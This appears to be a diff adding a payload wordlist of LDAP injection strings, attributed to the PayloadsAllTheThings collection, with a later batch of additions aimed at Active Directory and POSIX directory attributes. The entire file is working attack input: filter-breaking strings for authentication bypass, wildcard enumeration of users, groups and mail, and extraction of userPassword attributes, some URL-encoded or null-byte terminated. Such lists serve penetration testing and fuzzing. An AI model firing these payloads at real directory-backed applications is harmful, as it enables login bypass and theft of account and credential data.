@@ -1,0 +1,59 @@
+# LDAP Injection payloads
+# Source: https://github.com/swisskyrepo/PayloadsAllTheThings
+# Total: 54 payloads
+*
+*)(&
+*))%00
+*()|%26'
+*()|&'
+*)(uid=*))(|(uid=*
+admin)(&(password=*))
+admin)(|(password=*)
+x)(cn=*))(|(cn=*
+*)(objectClass=*
+)(uid=admin)(&(uid=
+*(uid=*)
+admin*
+*)(|(mail=*
+*))(|(mail=*
+*%00
+admin))(|(userPassword=*)
+)(|(uid=*)(userPassword=*
+*(|(mail=*))
+*(|(objectclass=*))
+*/*
+*|
+/
+//
+//*
+@*
+|
+admin*)((|userpassword=*)
+admin*)((|userPassword=*)
+x' or name()='username' or 'x'='y
+!
+%21
+%26
+%28
+%29
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%28%7C%28objectclass%3D%2A%29%29
+%2A%7C
+%7C
+&
+(
+)
+)(cn=))\x00
+
+# ── Round-2 additions (2026-10-29): modern/unique payloads, deduped vs existing ──
+*)(&(objectClass=user)(sAMAccountName=*
+*)(|(sAMAccountName=*)(userPrincipalName=*
+*)(&(userPassword=*))
+admin)(&(objectCategory=person)(sAMAccountName=*
+*)(objectClass=posixAccount)(uid=*
+*)(cn=*)
+)(|(objectclass=*))
+%2a%29%28%7c%28uid%3d%2a%29
+x)(&(userPassword=*))(|(userPassword=*
+*)(|(memberOf=*)
+*)(&(objectClass=group)(cn=*
